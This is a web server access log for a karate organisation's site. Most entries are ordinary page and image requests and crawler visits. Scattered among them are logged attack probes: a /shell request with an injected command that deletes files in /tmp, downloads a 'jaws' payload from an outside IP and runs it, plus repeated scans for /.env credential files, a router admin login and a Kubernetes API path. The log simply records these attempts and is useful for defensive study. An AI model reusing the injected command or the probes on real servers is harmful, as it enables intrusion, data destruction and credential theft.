::ffff:69.181.156.202 - - [29/Jan/2023:08:33:11 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:33:11 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:33:11 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:33:11 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /resources HTTP/1.1" 200 194907 "http://wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 200 2940 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 200 4046 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 200 3631 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 200 2677 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 200 2813 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 200 3043 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/bobook.gif HTTP/1.1" 200 6919 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 200 1934 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 200 12021 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 200 4025 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:11 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:12 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:12 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:12 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:16 +0000] "GET /events HTTP/1.1" 200 5867 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:16 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/events" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:16 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/events" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:16 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/events" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /resources HTTP/1.1" 200 194907 "http://wadokikai.org/events" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/bobook.gif HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 200 4025 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:18 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:36:21 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:37:59 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://wadokikai.org/events" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:37:59 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/events" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:38:03 +0000] "GET /resources HTTP/1.1" - - "http://wadokikai.org/events" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:38:03 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:69.181.156.202 - - [29/Jan/2023:08:38:03 +0000] "GET /images/favicon.ico HTTP/1.1" - - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:17.58.56.6 - - [29/Jan/2023:08:45:20 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
::ffff:103.135.89.113 - - [29/Jan/2023:09:21:09 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:114.119.150.15 - - [29/Jan/2023:09:23:01 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:222.128.6.150 - - [29/Jan/2023:09:24:28 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:159.65.193.109 - - [29/Jan/2023:09:25:48 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:114.119.159.15 - - [29/Jan/2023:09:29:57 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:207.46.13.107 - - [29/Jan/2023:09:40:31 +0000] "GET /images/BayFarmSep06.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:10:09:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:10:09:23 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.130.33 - - [29/Jan/2023:10:17:30 +0000] "GET /contact HTTP/1.1" 200 10017 "http://34.212.47.6/contact?s=1&ss=2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:138.255.12.146 - - [29/Jan/2023:10:25:17 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:162.253.129.136 - - [29/Jan/2023:10:29:13 +0000] "GET /contact.html HTTP/1.1" 404 151 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
::ffff:162.253.129.136 - - [29/Jan/2023:10:29:15 +0000] "GET /contact.html HTTP/1.1" 404 151 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
::ffff:162.253.129.136 - - [29/Jan/2023:10:29:17 +0000] "GET /contact.html HTTP/1.1" 404 151 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
::ffff:162.253.129.136 - - [29/Jan/2023:10:29:19 +0000] "GET /contact.html HTTP/1.1" 404 151 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
::ffff:93.114.184.79 - - [29/Jan/2023:10:30:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:10:56:21 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:10:56:21 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:64.62.197.184 - - [29/Jan/2023:10:59:36 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:18.207.159.18 - - [29/Jan/2023:11:01:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:11:01:05 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:64.62.197.190 - - [29/Jan/2023:11:02:00 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"
::ffff:178.128.152.119 - - [29/Jan/2023:11:04:37 +0000] "GET / HTTP/1.0" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
::ffff:207.46.13.107 - - [29/Jan/2023:11:21:42 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.47 - - [29/Jan/2023:11:22:00 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.47 - - [29/Jan/2023:11:22:00 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:11:24:49 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:11:24:49 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:40.77.167.20 - - [29/Jan/2023:11:25:09 +0000] "GET /images/index.jpg HTTP/1.1" 404 155 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:167.94.138.117 - - [29/Jan/2023:11:26:55 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:167.94.138.117 - - [29/Jan/2023:11:26:55 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.117 - - [29/Jan/2023:11:26:56 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.138.117 - - [29/Jan/2023:11:26:56 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.117 - - [29/Jan/2023:11:26:56 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:207.46.13.104 - - [29/Jan/2023:11:36:32 +0000] "GET /images/Naha-lineage.jpg HTTP/1.1" 200 212379 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:193.35.18.206 - - [29/Jan/2023:11:37:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:35.233.62.116 - - [29/Jan/2023:11:41:05 +0000] "GET / HTTP/1.1" 200 57378 "-" "python-requests/2.28.2"
::ffff:12.125.136.230 - - [29/Jan/2023:11:48:40 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:135.125.246.110 - - [29/Jan/2023:11:52:27 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:11:52:28 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.143.60.138 - - [29/Jan/2023:11:54:00 +0000] "GET /v1/graphql HTTP/1.1" 404 149 "-" "okhttp/5.0.0-alpha.10"
::ffff:95.214.235.205 - - [29/Jan/2023:12:07:27 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [29/Jan/2023:12:07:27 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:85.187.82.120 - - [29/Jan/2023:12:08:03 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:12:11:49 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:12:11:50 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.134.140.168 - - [29/Jan/2023:12:18:25 +0000] "GET /apis/apps/v1/namespaces/kube-system/daemonsets HTTP/1.1" 404 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
